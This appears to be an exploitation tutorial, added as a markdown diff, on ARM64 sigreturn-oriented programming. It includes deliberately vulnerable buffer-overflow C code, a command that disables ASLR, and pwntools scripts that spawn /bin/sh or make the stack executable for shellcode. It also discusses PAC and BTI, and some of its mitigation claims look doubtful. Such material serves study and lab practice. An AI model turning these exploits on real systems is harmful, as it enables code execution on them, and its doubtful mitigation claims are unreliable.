@@ -1,0 +1,230 @@
+# ## Pwntools example
+
+This example is creating the vulnerable binary and exploiting it. The binary **reads into the stack** and then calls **`sigreturn`**:
+
+```python
+from pwn import *
+
+binsh = "/bin/sh"
+context.clear()
+context.arch = "arm64"
+
+asm = ''
+asm += 'sub sp, sp, 0x1000\n'
+asm += shellcraft.read(constants.STDIN_FILENO, 'sp', 1024) #Read into the stack
+asm += shellcraft.sigreturn() # Call sigreturn
+asm += 'syscall: \n' #Easy symbol to use in the exploit
+asm += shellcraft.syscall()
+asm += 'binsh: .asciz "%s"' % binsh #To have the "/bin/sh" string in memory
+binary = ELF.from_assembly(asm)
+
+frame = SigreturnFrame()
+frame.x8 = constants.SYS_execve
+frame.x0 = binary.symbols['binsh']
+frame.x1 = 0x00
+frame.x2 = 0x00
+frame.pc = binary.symbols['syscall']
+
+p = process(binary.path)
+p.send(bytes(frame))
+p.interactive()
+```
+
+## bof example
+
+### Code
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+void do_stuff(int do_arg){
+    if (do_arg == 1)
+        __asm__("mov x8, 0x8b; svc 0;");
+    return;
+}
+
+char* vulnerable_function() {
+    char buffer[64];
+    read(STDIN_FILENO, buffer, 0x1000); // <-- bof vulnerability
+
+    return buffer;
+}
+
+char* gen_stack() {
+    char use_stack[0x2000];
+    strcpy(use_stack, "Hello, world!");
+    char* b = vulnerable_function();
+    return use_stack;
+}
+
+int main(int argc, char **argv) {
+    char* b = gen_stack();
+    do_stuff(2);
+    return 0;
+}
+```
+
+Compile it with:
+
+```bash
+clang -o srop srop.c -fno-stack-protector
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # Disable ASLR
+```
+
+## Exploit
+
+The exploit abuses the bof to return to the call to **`sigreturn`** and prepare the stack to call **`execve`** with a pointer to `/bin/sh`.
+
+```python
+from pwn import *
+
+p = process('./srop')
+elf = context.binary = ELF('./srop')
+libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")
+libc.address = 0x0000fffff7df0000 # ASLR disabled
+binsh = next(libc.search(b"/bin/sh"))
+
+stack_offset = 72
+
+sigreturn = 0x00000000004006e0 # Call to sig
+svc_call = 0x00000000004006e4  # svc    #0x0
+
+frame = SigreturnFrame()
+frame.x8 = 0xdd            # syscall number for execve
+frame.x0 = binsh
+frame.x1 = 0x00             # NULL
+frame.x2 = 0x00             # NULL
+frame.pc = svc_call
+
+payload = b'A' * stack_offset
+payload += p64(sigreturn)
+payload += bytes(frame)
+
+p.sendline(payload)
+p.interactive()
+```
+
+## bof example without sigreturn
+
+### Code
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+char* vulnerable_function() {
+    char buffer[64];
+    read(STDIN_FILENO, buffer, 0x1000); // <-- bof vulnerability
+
+    return buffer;
+}
+
+char* gen_stack() {
+    char use_stack[0x2000];
+    strcpy(use_stack, "Hello, world!");
+    char* b = vulnerable_function();
+    return use_stack;
+}
+
+int main(int argc, char **argv) {
+    char* b = gen_stack();
+    return 0;
+}
+```
+
+## Exploit
+
+In the section **`vdso`** it's possible to find a call to **`sigreturn`** in the offset **`0x7b0`**:
+
+<img src="../../../images/image (17) (1).png" alt="" width="563"><figcaption></figcaption>
+
+Therefore, if leaked, it's possible to **use this address to access a `sigreturn`** if the binary isn't loading it:
+
+```python
+from pwn import *
+
+p = process('./srop')
+elf = context.binary = ELF('./srop')
+libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")
+libc.address = 0x0000fffff7df0000 # ASLR disabled
+binsh = next(libc.search(b"/bin/sh"))
+
+stack_offset = 72
+
+sigreturn = 0x00000000004006e0 # Call to sig
+svc_call = 0x00000000004006e4  # svc    #0x0
+
+frame = SigreturnFrame()
+frame.x8 = 0xdd            # syscall number for execve
+frame.x0 = binsh
+frame.x1 = 0x00             # NULL
+frame.x2 = 0x00             # NULL
+frame.pc = svc_call
+
+payload = b'A' * stack_offset
+payload += p64(sigreturn)
+payload += bytes(frame)
+
+p.sendline(payload)
+p.interactive()
+```
+
+For more info about vdso check:
+
+And to bypass the address of `/bin/sh` you could create several env variables pointing to it, for more info:
+
+---
+
+## Finding `sigreturn` gadgets automatically (2023-2025)
+
+On modern distributions the `sigreturn` trampoline is still exported by the **vDSO** page but the exact offset may vary across kernel versions and build flags such as BTI (`+branch-protection`) or PAC.  Automating its discovery prevents hard-coding offsets:
+
+```bash
+# With ROPgadget ≥ 7.4
+python3 -m ROPGadget --binary /proc/$(pgrep srop)/mem --only "svc #0" 2>/dev/null | grep -i sigreturn
+
+# With rp++ ≥ 1.0.9 (arm64 support)
+rp++ -f ./binary --unique -r | grep "mov\s\+x8, #0x8b"   # 0x8b = __NR_rt_sigreturn
+```
+
+Both tools understand **AArch64** encodings and will list candidate `mov x8, 0x8b ; svc #0` sequences that can be used as the *SROP gadget*.
+
+> Note: When binaries are compiled with **BTI** the first instruction of every valid indirect branch target is `bti c`.  `sigreturn` trampolines placed by the linker already include the correct BTI landing pad so the gadget remains usable from unprivileged code.
+
+## Chaining SROP with ROP (pivot via `mprotect`)
+
+`rt_sigreturn` lets us control *all* general-purpose registers and `pstate`.  A common pattern on x86 is: 1) use SROP to call `mprotect`, 2) pivot to a new executable stack containing shell-code.  The exact same idea works on ARM64:
+
+```python
+frame = SigreturnFrame()
+frame.x8 = constants.SYS_mprotect   # 226
+frame.x0 = 0x400000                # page-aligned stack address
+frame.x1 = 0x2000                  # size
+frame.x2 = 7                       # PROT_READ|PROT_WRITE|PROT_EXEC
+frame.sp = 0x400000 + 0x100        # new pivot
+frame.pc = svc_call                # will re-enter kernel
+```
+
+After sending the frame you can send a second stage containing raw shell-code at `0x400000+0x100`.  Because **AArch64** uses *PC-relative* addressing this is often more convenient than building large ROP chains.
+
+## Kernel validation, PAC & Shadow-Stacks
+
+Linux 5.16 introduced stricter validation of userspace signal frames (commit `36f5a6c73096`).  The kernel now checks:
+
+* `uc_flags` must contain `UC_FP_XSTATE` when `extra_context` is present.
+* The reserved word in `struct rt_sigframe` must be zero.
+* Every pointer in the *extra_context* record is aligned and points inside the user address space.
+
+`pwntools>=4.10` crafts compliant frames automatically, but if you build them manually make sure to zero‐initialize *reserved* and omit the SVE record unless you really need it—otherwise `rt_sigreturn` will deliver `SIGSEGV` instead of returning.
+
+Starting with mainstream Android 14 and Fedora 38, userland is compiled with **PAC** (*Pointer Authentication*) and **BTI** enabled by default (`-mbranch-protection=standard`).  *SROP* itself is unaffected because the kernel overwrites `PC` directly from the crafted frame, bypassing the authenticated LR saved on the stack; however, any **subsequent ROP chain** that performs indirect branches must jump to BTI-enabled instructions or PACed addresses.  Keep that in mind when choosing gadgets.
+
+Shadow-Call-Stacks introduced in ARMv8.9 (and already enabled on ChromeOS 1.27+) are a compiler-level mitigation and *do not* interfere with SROP because no return instructions are executed—the flow of control is transferred by the kernel.
+
+## References
+
+* [Linux arm64 signal handling documentation](https://docs.kernel.org/arch/arm64/signal.html)
+* [LWN – "AArch64 branch protection comes to GCC and glibc" (2023)](https://lwn.net/Articles/915041/)
